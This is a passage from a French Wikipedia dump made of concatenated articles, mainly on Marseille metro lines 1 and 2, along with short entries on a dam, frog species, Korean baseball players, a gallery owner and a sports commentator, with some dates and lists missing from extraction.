Après des retards en raison notamment de problèmes de financement auprès de l'État, les travaux démarrent le . Le le premier tronçon de la ligne, entre La Rose et Saint-Charles est inauguré en grande pompe par Gaston Defferre. La totalité de la ligne est mise en service le .
En 1992, la ligne 1 est prolongée depuis la station Castellane jusqu'à la station La Timone, permettant la desserte du complexe hospitalier et universitaire de la Timone.
Le , la ligne 1 est prolongée de entre la Timone et la Fourragère. Ce prolongement, intégralement souterrain, dessert quatre nouvelles stations et il s'agit du premier tronçon de ligne du réseau marseillais à avoir été construit à l'aide d'un tunnelier.
Tracé et stations.
Tracé.
Long de 12,9 , le tracé démarre de la station "La Rose - Technopôle de Château-Gombert" où se trouvent en amont le dépôt de la Rose ainsi que l’unique atelier de maintenance du métro marseillais. La ligne emprunte le viaduc de La Rose, traverse le quartier éponyme et, après un passage sur le Jarret, descend en tranchée couverte pour passer sous l’avenue Jean-Paul Sartre puis ressort à l’air libre à l’approche de la cité Frais-Vallon desservie par la station "Frais Vallon" située sur le terre-plein central de cette même avenue qui passe alors en voie rapide à partir de là. 
Ensuite, tout en longeant cette même voie rapide entre ses deux chaussées, la ligne poursuit son tracé aérien vers le sud-ouest en passant sous les viaducs de l’échangeur de Frais-Vallon et de la rocade L2 et, à partir d’un passage sous une passerelle piétonne, les voies de la ligne se séparent pour desservir l’unique quai central de la station "Malpassé". Le tracé se poursuit sur deux viaducs séparés au-dessus du parking de la station puis les deux voies se réunissent. La ligne descend en tranchée couverte pour passer sous la chaussée ouest de la voie rapide puis en ressort, passe sous les ponts des bretelles et du boulevard Barry et arrive à la station "Saint-Just - Hôtel du Département" mi-aérienne mi-souterraine car elle est située en partie sous l’hôtel du département des Bouches-du-Rhône.
La ligne descend ensuite en tunnel souterrain par une longue et lègère descente en ligne droite sous le boulevard de la Fédération et l’église des Chartreux pour arriver à la station "Chartreux" située place Edmond-Audran dans le quartier des Chartreux. La ligne passe ensuite en ligne droite sous l’avenue des Chartreux puis, 300 plus loin, les voies se séparent en deux tubes à hauteur des voies de la ligne de Marseille à Vintimille puis les deux tubes passent sous la rue Lacépède puis desservent "Cinq-Avenues - Longchamp" au niveau du boulevard du Jardin-Zoologique où la ligne fait correspondance avec la ligne 2 du tramway dont l’arrêt se situe sur l’avenue du Maréchal-Foch à environ 300 . Elle passe ensuite sous le parc du palais Longchamp et traverse en souterrain le boulevard éponyme ainsi que les voies de la ligne 2 du tramway pour arriver au cours Joseph-Thierry où se situe "Réformés-Canebière" et faire une nouvelle fois correspondance avec cette même ligne de tramway.
La ligne oblique vers le nord-ouest en passant sous le quartier du Chapitre, passe au-dessus des voies de la ligne 2 du métro puis les croise à la station "Saint-Charles" située sous la gare éponyme qui permet la correspondance et le raccordement entre les deux lignes par des voies intermédiaires puis, après la station, se sépare de la ligne 2. Toujours en section bitube, la ligne effectue une courbe sous le boulevard Charles-Nédelec puis passe près d’une voie de service qui, à l’époque de l’inauguration de la ligne en 1977, permettait aux rames d’effectuer un retournement d’une voie à l’autre et arrive à la station "Colbert - Hôtel de Région" située sous la rue Sainte-Barbe. Elle passe sous les voies des lignes 2 et 3 à hauteur de la rue Colbert puis sous les immeubles jouxtant la rue Henri-Barbusse pour arriver à la station "Vieux-Port - Hôtel de Ville" sous le Vieux-Port. Elle continue vers le sud en passant sous le quartier de l’Opéra et arrive à "Estrangin-Préfecture", elle passe ensuite sous la rue Paradis puis effectue un virage à 90 degrés vers l’est à hauteur de la rue Sainte-Victoire. Les deux voies de la ligne se réunissent, passent au-dessus des voies de la ligne 2 du métro et la ligne dessert "Castellane" pour permettre de faire correspondance avec cette même ligne ainsi qu’avec la ligne 3 du tramway.
La ligne poursuit son tracé vers l’est en passant en ligne droite sous le boulevard Baille en desservant, à hauteur de la rue des Vertus, la station "Baille" qui dessert le quartier de Baille ainsi que l’hôpital de la Conception. Elle continue à l’est en passant sous ce même boulevard puis oblique vers le nord-est à hauteur de la rue Bravet puis passe sous le boulevard Jean-Moulin où se trouve la station "La Timone" qui dessert principalement l’hôpital de la Timone. 
La ligne continue vers le nord-est en passant sous l’hôpital ainsi que le quartier de Saint-Pierre puis arrive à "La Blancarde" où elle fait correspondance avec les lignes 1 et 2 du tramway et les trains à la gare de la Blancarde, elle passe ensuite sous les voies ferrées puis sous les immeubles résidentiels jouxtant l’avenue d’Haïti puis arrive à "Louis Armand" à hauteur du boulevard éponyme. Elle passe ensuite sous les villas du quartier de Saint-Barnabé et arrive au cœur du quartier pour desservir "Saint-Barnabé". Elle trace ensuite vers l’est sous le boulevard Gassendi pour arriver au terminus "La Fourragère" à proximité de la rocade L2 et du quartier éponyme où le tracé se termine immédiatement en l’absence d’arrière-gare, l’interstation en amont permet aux rames de changer de voie et la station terminus sert de retournement sur ses deux voies.
Liste des stations.
Les stations de la ligne sont présentées du nord-est au sud-est :
Intermodalité.
La ligne 1 offre des correspondances directes avec la ligne 2 du métro aux stations "Saint-Charles" et "Castellane", avec les trois lignes de tramway aux stations "Cinq-Avenues - Longchamp" (T2), "Réformés - Canebière" (T2), "Castellane" (T3) et "La Blancarde" (T1 &amp; T2) et elle offre aussi une correspondance avec les trains SNCF aux stations "Saint-Charles" (TER, Intercités &amp; TGV) et "La Blancarde" (TER &amp; Intercités). Elle permet également la correspondance directe avec les lignes de bus à haut niveau de service B1 à la station "Castellane", les lignes B3A et B3B respectivement aux stations "Malpassé" et "La Rose - Technopôle de Château-Gombert" ainsi que la ligne B4 (actuellement en construction) aux stations "Frais-Vallon" et "La Fourragère". Elle offre aussi, outre une connexion directe avec de nombreuses lignes de bus RTM à chacune de ses stations, une correspondance à distance avec les nombreuses lignes de bus de journée et de soirée qui font terminus au pôle d’échanges "Canebière (Bourse)" ainsi que les deux lignes de nuit N1 et N2 à la station "Vieux-Port - Hôtel de Ville". Elle est aussi connectée aux lignes d’autocars C8 et M06 du réseau Transmétropole respectivement aux stations "Saint-Charles" et "Castellane", les lignes lecar aux stations "Saint-Charles", "Castellane" et "La Fourragère" ainsi qu’aux lignes Zou ! à la gare routière de "Saint-Charles".

</doc>
<doc id="3215098" url="https://fr.wikipedia.org/wiki?curid=3215098" title="Barrage de Beauregard">
Barrage de Beauregard

Le barrage de Beauregard est un barrage hydroélectrique sur la Doire de Valgrisenche, dans le haut Valgrisenche, en Vallée d'Aoste, formant le lac du même nom. 
Histoire.
Lors de sa construction, entre 1951 et 1954, déjà, plusieurs études avaient identifié la présence de matériaux anormaux dans les couches morainiques et alluviales. Le rapport final, de 1954, indiquait cependant que l'ouvrage avait pu être mené à bien grâce aux travaux de consolidation et d'étanchéité effectués sur l'épaule gauche du barrage.
En 1957, cinq hameaux sont submergés définitivement : Beauregard (d'où le barrage tire son nom), Sevey, Suplun, Fornet, Chappuis, Usellières et Surier.
En 1959, lorsque le niveau maximum est atteint, à d'altitude, on détecte un mouvement de quelques centimètres sur l'épaule gauche du barrage qui génère des déformations et des dégâts dans le mur du barrage. En conséquence, entre 1964 et 1969, l'altitude maximum est abaissée à , puis à .
Au début des années 2000, des études sont entreprises afin de sécuriser l'ouvrage et de permettre une remise en eau optimum. Afin de protéger la population en aval, en 2004, l'altitude maximale est encore abaissé à . En 2006, une étude de faisabilité pour la mise en sécurité de l'ouvrage est présentée.

</doc>
<doc id="3215100" url="https://fr.wikipedia.org/wiki?curid=3215100" title="Greenpoint Stadium">
Greenpoint Stadium



</doc>
<doc id="3215105" url="https://fr.wikipedia.org/wiki?curid=3215105" title="Greg Allman">
Greg Allman



</doc>
<doc id="3215108" url="https://fr.wikipedia.org/wiki?curid=3215108" title="Odorrana versabilis">
Odorrana versabilis

Odorrana versabilis est une espèce d'amphibiens de la famille des Ranidae.
Répartition.
Cette espèce est endémique du Sud-Est de la République populaire de Chine. Elle se rencontre du Sud de la province d'Anhui, du Jiangxi et du Guangdong au Guizhou.

</doc>
<doc id="3215109" url="https://fr.wikipedia.org/wiki?curid=3215109" title="Barbara Gladstone">
Barbara Gladstone

Barbara Gladstone, née le à Philadelphie et morte le à Neuilly-sur-Seine, est une galeriste et marchande d'art américaine spécialisée dans l'art contemporain.
Biographie.
Installée à New York depuis la fin des années 1970, Barbara Gladstone s'oriente tout d'abord vers la promotion de la figuration libre puis vers celle d'artistes développant leur travail sur les nouveaux médias, notamment la vidéo avec la production et la présentation des films de Matthew Barney, comme le cycle "Cremaster" et "Drawing Restraint 9" ou des vidéos de Shirin Neshat.
Barbara Gladstone travaille avec deux galeries à New York sur la 21e rue et 24e rue dans le quartier de Chelsea. Parmi les artistes principaux qu'elle représente se trouvent Shirin Neshat, Sarah Lucas, Anish Kapoor, Mario Merz, Damián Ortega, Matthew Barney.

</doc>
<doc id="3215110" url="https://fr.wikipedia.org/wiki?curid=3215110" title="Arrondissement de Dordrecht">
Arrondissement de Dordrecht

Larrondissement de Dort ou de Dordrecht est une ancienne subdivision administrative française du département des Bouches-de-la-Meuse créée le et supprimée le .
Historique.
Le département des Bouches-de-la-Meuse est divisé en arrondissements par le décret du organisant les départements de la Hollande. L'arrondissement est un des quatre créés dans les Bouches-de-la-Meuse et est alors divisé en huit cantons.
Composition.
En 1812, l'arrondissement comprend les cantons de Culembourg, Dordrecht (deux cantons), Oud-Beijerland, Ridderkerk, Sliedrecht et Strijen.
Comme tous les territoires de l'ancien royaume de Hollande, l'arrondissement est supprimé officiellement par le traité de Paris, le .

</doc>
<doc id="3215116" url="https://fr.wikipedia.org/wiki?curid=3215116" title="Han Ki-joo">
Han Ki-joo

Han Ki-joo (né le à Gwangju, Corée du Sud) est un joueur coréen de baseball qui joue avec les Kia Tigers de Gwangju dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin. Mais il a obtenu les surnoms : "l'écrivain suspense" et "le train galaxie 999" pour les trompés aux tour les jeux qu'il a jouée.

</doc>
<doc id="3215125" url="https://fr.wikipedia.org/wiki?curid=3215125" title="Mohamed Rebaï">
Mohamed Rebaï

Mohamed Rebaï, né le 8 mai 1977, est un escrimeur tunisien pratiquant le sabre. Il a gagné sept médailles d'or aux championnats d'Afrique d'escrime en 2001, 2003, 2004, 2005 et 2006.

</doc>
<doc id="3215133" url="https://fr.wikipedia.org/wiki?curid=3215133" title="Ligne 2 du métro de Marseille">
Ligne 2 du métro de Marseille

La ligne 2 du métro de Marseille est une des deux lignes du réseau métropolitain de Marseille. Ouverte en 1984 et étendue en 1986, 1987 et 2019, elle compte 13 stations entre Gèze et Sainte-Marguerite Dromel.
D’une longueur de , la ligne suit un axe nord-sud de Gèze au Rond-point du Prado en desservant notamment les quartiers des Crottes, Saint-Mauront, la Joliette, Noailles, la Plaine, et Périer puis oblique vers l'est pour desservir le quartier de Sainte-Marguerite. Elle est en correspondance avec la ligne 1 à Saint-Charles et Castellane.
Historique.
Construction.
Le projet initial de métro de Marseille, présenté en 1969, prévoit une seconde ligne, dite , entre la gare d'Arenc à Mazargues. Le trajet définitif est arrêté en 1978 mais l'État, qui finance le projet à hauteur de 30 %, étale le versement de sa participation ce qui oblige à réaliser la ligne en plusieurs étapes. 
Les travaux débutent en pour un premier tronçon entre Joliette et Castellane. Le gros œuvre se termine à la fin de l'année 1983 et le tronçon est inauguré le . En parallèle, les travaux débutent fin 1982 sur les sections nord (vers Bougainville) et sud (vers Sainte-Marguerite - Dromel) ainsi que pour la construction du dépôt "Zoccola". Les sections sud et nord sont inaugurées, respectivement, le et le .
Il faut attendre 2013 pour que débutent les travaux au nord de Bougainville afin d'allonger la ligne de et de construire une nouvelle station, nommée "Gèze", ouverte le 16 dècembre 2019 après plusieurs années de retard. Elle comporte un pôle d'échanges multimodal ainsi qu'un parc relais d'une capacité de 650 places de stationnement.
Prolongements à venir.
Au cours des années 1980, plusieurs prolongements sont envisagés par la RTM et par la municipalité, comme la création d'un embranchement de la ligne 2 en direction du sud, depuis la station Rond-point du Prado vers le quartier de Bonneveine et le prolongement de la ligne 2 au sud-est, de Sainte-Marguerite vers Saint-Loup puis Saint-Marcel, mais aucun n'a été réalisé pour l'instant. Un projet de prolongement vers le nord (Gèze, la Cabucelle, Madrague-Ville), adopté en 1983, n'est pas réalisé à l'époque faute de financement.
Le prolongement de la ligne 2 vers l'hôpital Nord, afin de desservir les Quartiers nord, a fait l'objet d'un appui du gouvernement en 2013. Toutefois, la communauté urbaine puis la métropole favorisent plutôt un prolongement de la ligne au sud, vers Saint-Loup. Des études en ce sens ont été lancées en pour une ouverture prévue en 2025 : le prolongement envisagé serait de et comprendrait la construction de cinq nouvelles stations. Une sixième station avec pôle d'échange, sur l'emplacement d'une ancienne usine Rivoire et Carret, est également à l'étude
À plus long terme, l"'Agenda de la mobilité métropolitaine" adopté en 2016 envisage un prolongement de la ligne 2 vers La Valentine. Le "Plan de mobilité metropolitain" approuvé en décembre 2021 annonce quant à lui un prolongement vers la Pomme à horizon 2030.En , il est annoncé que dans le cadre du plan Marseille en grand est envisagé un prolongement de deux stations de la ligne 2 vers le sud-est, jusqu'à la ZAC Vallon Régny. 
Si les raccourcissements successifs du prolongement de la ligne 2 à chaque annonce se justifient pour raisons financières selon les pouvoirs publics, les oppositions politiques et certaines associations spécialisées voient ces décisions comme étant révélatrices de la faible volonté politique locale de développer le réseau de métro local, pourtant largement sous-dimensionné pour une ville de la taille de Marseille.
Tracé et stations.
Tracé.
Long de 9,8 , le tracé de la ligne 2 démarre par un tunnel d’arrière-gare comportant deux voies de retournement séparées par un quai central étroit, situé sous l’intersection entre l’avenue Félix-Zoccola, l’avenue du Cap-Pinède, l’avenue Ibrahim-Ali et le boulevard du Capitaine-Gèze, débouchant à la station "Gèze" établie à fleur de sol entre les quartiers du Canet, des Arnavaux, de la Cabucelle et des Crottes ainsi que le dépôt de métro Zoccola directement relié au tunnel par une voie de service contournant la station par l’ouest. Elle passe en aérien entre les voies de garage du dépôt puis emprunte un viaduc longeant à l’est l’ancienne gare de marchandises du Canet à partir des escaliers d’une passerelle piétonne qui la traverse jusqu’au quartier éponyme et à l’ouest des bâtiments du quartier des Crottes en pleine mutation tout en passant au-dessus de la traverse du Bachas pour arriver à "Bougainville". 
Ensuite, le tracé en viaduc passe au-dessus du boulevard Ferdinand-de-Lesseps et de l’A557 puis, à proximité du parc Bougainville et du ruisseau des Aygalades, par une rampe de descente, plonge en souterrain pour passer sous le quartier de Saint-Mauront afin d’arriver à "National". Le tunnel effectue ensuite une descente puis redevient plat sur une ligne droite puis bifurque à l’ouest sous le quartier de la Villette et de l’hôpital européen pour arriver à "Désirée Clary". Après une dernière descente en ligne droite, la ligne effectue une courbe vers l’ouest en passant sous la rue Désirée-Clary puis par le boulevard de Dunkerque où passent les voies des lignes de tramway 2 et 3 ainsi que le tunnel de la Major pour desservir la station "Joliette" afin de faire correspondance avec les lignes de tram et la gare maritime. La ligne repart vers l’est en passant sous le boulevard des Dames et arrive à "Jules Guesde" en tunnel bitube sous la place éponyme. Les deux tunnels de la ligne partent ensuite sous le boulevard Charles-Nédelec, passent sous les tunnels de la ligne 1 du métro puis rejoignent ceux-ci parallèlement afin de desservir "Saint-Charles" et sa gare où les voies de la ligne 2, parallèles à la ligne 1, sont reliées par des voies intermédiaires qui permettent la correspondance et le raccordement entre les deux lignes. 
Les tubes de la ligne 2 se séparent de ceux de la ligne 1 et le tracé se poursuit vers le sud en ligne droite sous les boulevards d’Athènes et Dugommier pour arriver à la station "Noailles" qui assure la correspondance avec la ligne 1 du tramway en souterrain à l’emplacement de l’ancien terminus de la ligne 68 ainsi que la ligne 2 en surface via l’arrêt "Canebière Garibaldi" à l’intersection avec la Canebière et le boulevard Garibaldi. Toujours bitube, la ligne entre dans le quartier Notre-Dame-du-Mont et passe ensuite sous le cours Lieutaud, la rue des Trois-Mages et le cours Julien pour arriver à "Notre-Dame-du-Mont - Cours Julien", à proximité immédiate de la place Notre-Dame-du-Mont et à 300 mètres de la place Jean-Jaurès dite « la Plaine ». Elle passe ensuite sous la rue de Lodi puis la rue Marengo et bifurque légèrement à l’ouest pour reprendre son caractère monotube et passer sous les voies de la ligne 1 du métro pour arriver à "Castellane" et y faire correspondance avec, en plus de la ligne 1, la ligne 3 du tramway qui passe sur la place Castellane. 
La ligne effectue ensuite après une légère descente une ligne droite vers le sud sous l’avenue du Prado, passe sous les deux tubes superposés du tunnel Prado-Carénage et arrive à la station "Périer" à l’intersection avec le boulevard éponyme et l’allée Turcat-Méry. Elle continue à passer sous cette même avenue sur une longue ligne droite puis courbe légèrement vers l’est, entame une montée et arrive à "Rond-Point du Prado" sous le rond-point éponyme, près de l’entrée du parc Chanot.
La ligne passe ensuite sous le boulevard Michelet et oblique vers l’est en effectuant une montée et une courbe à 90 degrés pour sortir de terre à hauteur du virage sud de l’Orange Vélodrome. Elle longe en viaduc le parvis de la tribune Ganay au nord et le stade Pierre-Delort au sud. Elle passe tout près du Jarret enterré sous la rue Raymond-Teisseire qui se jette dans l’Huveaune tout près du palais des sports. Le viaduc passe au-dessus de l’enceinte du palais des sports et arrive à son terminus "Sainte-Marguerite Dromel" situé au-dessus du boulevard Schloesing et des voies de la ligne 3 du tramway pour y faire à nouveau correspondance. Le tracé de la ligne s’arrête 100 mètres après cette station par un viaduc d’arrière-gare qui butte au bout de la gare d’échanges et en bordure de l’Huveaune.
Liste des stations.
Les stations de la ligne sont présentées du nord au sud :
Intermodalité.
La ligne 2 offre des correspondances directes avec la ligne 1 du métro aux stations "Saint-Charles" et "Castellane", avec les trois lignes de tramway aux stations "Gèze" (T2 &amp; T3, en construction), "Joliette" (T2 &amp; T3), "Noailles" (T1 &amp; T2), "Castellane" (T3) et "Sainte-Marguerite - Dromel" (T3, en construction) et elle offre aussi une correspondance avec les trains SNCF à la station "Saint-Charles" (TER, Intercités &amp; TGV). Elle permet également la correspondance directe avec les lignes de bus à haut niveau de service B1 aux stations "Castellane", "Périer" et "Rond-Point du Prado" ainsi que les lignes B2 et B4 (en construction) à la station "Gèze". Elle offre aussi une connexion directe avec de nombreuses lignes de bus RTM à chacune de ses stations. Elle est aussi connectée aux lignes d’autocars C8 et M06 du réseau Transmétropole respectivement aux stations "Joliette", "Jules Guesde", "Saint-Charles" et "Castellane", les lignes lecar aux stations "Bougainville", "Saint-Charles", "Castellane", "Périer" et "Rond-Point du Prado" ainsi qu’aux lignes Zou ! à la gare routière de "Saint-Charles".

</doc>
<doc id="3215135" url="https://fr.wikipedia.org/wiki?curid=3215135" title="Epangue">
Epangue



</doc>
<doc id="3215136" url="https://fr.wikipedia.org/wiki?curid=3215136" title="Arrondissement de Gorinchem">
Arrondissement de Gorinchem

L'arrondissement de Gorinchem ou l'arrondissement de Gorcum (en néerlandais : ) était une subdivision administrative française du département des Bouches-de-la-Meuse, créée le et supprimée le .
Géographie.
Cantons.
L'arrondissement de Gorinchem comprenait les cantons suivants : 

</doc>
<doc id="3215137" url="https://fr.wikipedia.org/wiki?curid=3215137" title="Pieck Wilhelm">
Pieck Wilhelm



</doc>
<doc id="3215142" url="https://fr.wikipedia.org/wiki?curid=3215142" title="GP Ouest France-Plouay">
GP Ouest France-Plouay



</doc>
<doc id="3215145" url="https://fr.wikipedia.org/wiki?curid=3215145" title="Lithobates vibicarius">
Lithobates vibicarius

Lithobates vibicarius est une espèce d'amphibiens de la famille des Ranidae.
Répartition.
Cette espèce se rencontre entre et d'altitude :

</doc>
<doc id="3215146" url="https://fr.wikipedia.org/wiki?curid=3215146" title="Rana godmani">
Rana godmani



</doc>
<doc id="3215151" url="https://fr.wikipedia.org/wiki?curid=3215151" title="Bamanan">
Bamanan



</doc>
<doc id="3215153" url="https://fr.wikipedia.org/wiki?curid=3215153" title="Papurana volkerjane">
Papurana volkerjane

Papurana volkerjane est une espèce d'amphibiens de la famille des Ranidae.
Répartition.
Cette espèce est endémique de Nouvelle-Guinée. Elle se rencontre en Indonésie et en Papouasie-Nouvelle-Guinée entre et d'altitude dans les monts Wondiwoi, Bewani et Torricelli.

</doc>
<doc id="3215154" url="https://fr.wikipedia.org/wiki?curid=3215154" title="Prix de L'Académie">
Prix de L'Académie



</doc>
<doc id="3215161" url="https://fr.wikipedia.org/wiki?curid=3215161" title="Undercooled">
Undercooled

undercooled est le premier single de l'album "Chasm" de Ryūichi Sakamoto sorti le au Japon.

</doc>
<doc id="3215162" url="https://fr.wikipedia.org/wiki?curid=3215162" title="Koh-lanta 8">
Koh-lanta 8



</doc>
<doc id="3215164" url="https://fr.wikipedia.org/wiki?curid=3215164" title="Vide">
Vide

Le vide est ordinairement défini comme l'absence de matière dans une zone spatiale. Vide peut désigner :

</doc>
<doc id="3215165" url="https://fr.wikipedia.org/wiki?curid=3215165" title="Jang Won-sam">
Jang Won-sam

Jang Won-sam (né le à Changwon, Corée du Sud) est un joueur coréen de baseball qui joue avec les Samsung Lions de Daegu dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215178" url="https://fr.wikipedia.org/wiki?curid=3215178" title="Rhyssa persuasoria">
Rhyssa persuasoria

Rhyssa persuasoria, la rhysse persuasive, est une espèce d'insectes hyménoptères de la famille des Ichneumonidae.
Description.
La longueur varie de 12 à . La femelle dont l'ovipositeur peut atteindre parasite les larves du sirex géant ("Urocerus gigas").
Biologie.
La femelle est capable de détecter la présence des larves-hôtes dans les galeries des troncs d'arbres et réussit à enfoncer son mince ovipositeur dans le bois: les deux moitiés de l'appendice tournent très rapidement d'avant en arrière et forent un trou dans le bois comme un foret. Un œuf est pondu à proximité de chaque larve. La larve de la rhysse se nourrit extérieurement de son hôte.
Répartition.
L'insecte est visible en été. L'espèce est répandue dans les sapinières et pineraies.

</doc>
<doc id="3215179" url="https://fr.wikipedia.org/wiki?curid=3215179" title="OPERANDE">
OPERANDE



</doc>
<doc id="3215181" url="https://fr.wikipedia.org/wiki?curid=3215181" title="Kim Kwang-hyun">
Kim Kwang-hyun

Kim Kwang-hyun (né le à Séoul en Corée du Sud) est un joueur coréen de baseball qui joue avec les Cardinals de Saint-Louis de la Ligue majeure de baseball.
Il a obtenu la médaille d'or lors des Jeux olympiques 2008 à Pékin.
Biographie.
Corée du Sud.
Kim Kwang-hyun joue avec les SK Wyverns d'Incheon dans la ligue sud-coréenne de baseball de 2007 à 2016, puis en 2018 et 2019.
En 298 matchs joués, dont 276 comme lanceur partant, il présente une moyenne de points mérités de 3,27 avec 136 victoires, 77 défaites et retraits sur des prises en manches et deux tiers lancées.
Amérique du Nord.
Kim Kwang-hyun rejoint les Cardinals de Saint-Louis de la Ligue majeure de baseball, avec qui il dispute son premier match le .

</doc>
<doc id="3215182" url="https://fr.wikipedia.org/wiki?curid=3215182" title="OPERATEUR">
OPERATEUR



</doc>
<doc id="3215184" url="https://fr.wikipedia.org/wiki?curid=3215184" title="Général de Montriveau">
Général de Montriveau

Le marquis Armand de Montriveau est un personnage de "La Comédie humaine" d’Honoré de Balzac. Fils du ci-devant général de Montriveau, originaire de Bourgogne, mort à la bataille de Novi, il fait partie des « lions » parmi lesquels se trouvent : Eugène de Rastignac, Henri de Marsay, Lucien de Rubempré et Maxime de Trailles. 
Il sert Napoléon sans enthousiasme, se fâche avec les Bourbons qui ne lui reconnaissent pas son grade, puis il part pour l’Égypte avec monsieur du Châtelet. À son retour, il tombe amoureux d’Antoinette de Langeais, ce sera le plus grand drame de sa vie. Il apparaît principalement dans "La Duchesse de Langeais" et "Autre étude de femme".
Caractérisation.
Il est décrit en 1818 dans "La Duchesse de Langeais" :
Chronologie d’Armand de Montriveau dans "La Comédie humaine".
Il apparaît aussi dans :

</doc>
<doc id="3215187" url="https://fr.wikipedia.org/wiki?curid=3215187" title="Les enfants de Dune">
Les enfants de Dune



</doc>
<doc id="3215192" url="https://fr.wikipedia.org/wiki?curid=3215192" title="Mrowiny">
Mrowiny

Mrowiny est un village polonais de la gmina de Żarów situé au Sud du pays, en basse-Silésie. On peut y trouver le palais historique de la famille von Kulmiz, dont la tour fut détruite pendant la Seconde Guerre mondiale, ainsi que la chapelle accueillant leurs sépultures.
Histoire.
De 1742 à 1945, Konradswaldau fait partie de l'arrondissement de Schweidnitz dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="3215194" url="https://fr.wikipedia.org/wiki?curid=3215194" title="Pignon d'Inde">
Pignon d'Inde



</doc>
<doc id="3215198" url="https://fr.wikipedia.org/wiki?curid=3215198" title="CSIO">
CSIO

L'abréviation CSIO peut désigner :

</doc>
<doc id="3215202" url="https://fr.wikipedia.org/wiki?curid=3215202" title="Équipe de Cuba de base-ball">
Équipe de Cuba de base-ball



</doc>
<doc id="3215203" url="https://fr.wikipedia.org/wiki?curid=3215203" title="Alexandre Boyon">
Alexandre Boyon

Alexandre Boyon, né le à Saint-Maur-des-Fossés (Val-de-Marne), est un journaliste sportif français travaillant pour France Télévisions.
Principalement connu pour son métier, il est spécialiste des sports olympiques, et commente sur les chaînes du groupe France Télévisions les compétitions de natation (depuis 1997), d'aviron (depuis 1997), de ski alpin (de 2007 à 2017), d'athlétisme (depuis les championnats du monde 2009), et de biathlon (depuis 2018).
Biographie.
Enfance, jeunesse et formation.
Né d'un père pratiquant l'aviron, Alexandre Boyon commence à être initié très jeune à cette discipline. Passionné de sport, il est aussi licencié en natation à l’âge de 10 ans. Persévérant dans sa pratique de l'aviron, il atteint par la suite le haut-niveau et est sacré champion de France élite 4 barré en 1988 et 1989. Il arrête à l’âge de 25 ans, déclarant dans une interview en 2024 n'avoir .
Ses études débutent par un DEUG de sciences économiques, puis Boyon poursuit avec une maîtrise de gestion à Dauphine puis un troisième cycle de communication à Nantes. Il se dirige vers le journalisme sportif à l'occasion d'un stage au sein de TV8 Mont-Blanc, où il parvient à .
Carrière chez France Télévisions.
Ainsi, Alexandre Boyon retrouve le milieu sportif en rejoignant France Télévisions en 1992.
De 1997 à 2013, il commente les compétitions de natation avec Michel Rousseau, accompagnés de Roxana Maracineanu de 2007 à 2013. Il commente ensuite la natation aux côtés de Frédérick Bousquet et Roxana Maracineanu (2014), Laure Manaudou et Philippe Lucas (2015 à 2016), Florent Manaudou et Ludivine Loiseau (2017 à 2018), Yannick Agnel (2019 à 2021) puis de Camille Lacourt à partir de 2022.
À partir des Jeux olympiques d'été de 2000, il commente les cérémonies d'ouvertures et de clôture de l'événément diffusées par France Télévisions. Ainsi, en 2010, il commente la cérémonie d'ouverture des JO de Vancouver avec Daniel Bilalian et Roch Voisine. En 2014, il commente la cérémonie d'ouverture des JO de Sotchi avec Daniel Bilalian et Alban Mikoczy. En 2016, il commente la cérémonie d'ouverture des JO de Rio avec Daniel Bilalian et Raí, la cérémonie de clôture avec Lionel Chamoulaud et Raí, les épreuves de natation avec Laure Manaudou et Philippe Lucas, les épreuves d'athlétisme avec Patrick Montel, Stéphane Diagana et Éric-Emmanuel Schmitt et de pentathlon moderne avec Adèle Stern. Il commente aussi les cérémonies d'ouverture et de clôture des Jeux paralympiques de Rio avec Patrick Montel et Jean Minier.
En 2017, France Télévisions renouvelle de nouveau ses consultants pour la natation. Il commente les championnats du monde de natation 2017 avec Florent Manaudou et Ludivine Loiseau.
À partir de , il cède les commentaires du ski alpin à Alexandre Pasteur, ancien commentateur de la discipline sur Eurosport de 1995 à 2017, et devient alors le commentateur du biathlon à partir des Jeux olympiques d'hiver de 2018. En 2018, il commente la cérémonie d'ouverture des JO de Pyeongchang avec Alexandre Pasteur et , ancienne directrice de l’Institut d’études coréennes au Collège de France. Il commente aussi les cérémonies d'ouverture et de clôture des Jeux paralympiques de Pyeongchang avec Patrick Montel et Vincent Gauthier-Manuel.
En 2018, il commente aussi les épreuves de natation des championnats sportifs européens avec Florent Manaudou.
En , il commente le Marathon de Paris avec Stéphane Diagana après la suspension de l'habituel commentateur Patrick Montel pour des propos polémiques sur le dopage.
Du au , il couvre les championnats du monde d'athlétisme à Doha au sein d'une équipe renouvelée composée de Laurent Luyat, Alexandre Pasteur, Stéphane Diagana et Yohann Diniz.
En 2021, il commente la cérémonie d'ouverture des JO de Tokyo avec Thierry Marx et Églantine Éméyé, les épreuves de natation avec Yannick Agnel (bassin) ou Aurélie Muller (eau libre), les épreuves d'athlétisme avec Alexandre Pasteur et Stéphane Diagana, les épreuves de pentathlon moderne avec Amélie Cazé et la cérémonie de clôture avec Marie-Christelle Maury et Thierry Marx.
En 2022, il commente le biathlon aux Jeux olympiques de Pékin en compagnie de la championne olympique du relais-mixte Marie Dorin-Habert.
En 2024, il commente les cérémonies d'ouverture et de clôture des jeux olympiques de Paris, avec Daphné Bürki et Laurent Delahousse. Il commente également les épreuves de natation aux côtés de Camille Lacourt et Laure Manaudou, de natation en eau libre avec Aurélie Muller et d'athlétisme avec Alexandre Pasteur, Stéphane Diagana et Maryse Éwanjé-Épée.
Palmarès sportif.
Il est champion de France élite en 4 barré (sprint) en 1988 et 1989. 
Distinctions.
Il a reçu le prix du meilleur reportage sportif dans la catégorie JT au "Micro d’or 1994", et dans la catégorie magazine au "Micro d’or 2000".
En 2008, il reçoit le Prix du commentateur sportif décerné par l'association des écrivains sportifs. Ce prix est décerné à un journaliste, professionnel, commentateur audiovisuel, aux connaissances et au jugement appréciés qui, dans ses interventions sur le sport, se sera exprimé avec le souci constant de respecter les règles de la langue française.

</doc>
<doc id="3215211" url="https://fr.wikipedia.org/wiki?curid=3215211" title="John Michael Talbot">
John Michael Talbot

John Michael Talbot (né le à Oklahoma City, Oklahoma) est un moine catholique romain, chanteur, compositeur et guitariste américain. Il est le chanteur le plus populaire de l'église catholique. Il est aussi le fondateur de la communauté monastique "The Brothers and Sisters of Charity" (Les Frères et Sœurs de Charité) qui est localisé à Eureka Springs, Arkansas.

</doc>
<doc id="3215215" url="https://fr.wikipedia.org/wiki?curid=3215215" title="Sandro Da Silva Mendonca">
Sandro Da Silva Mendonca



</doc>
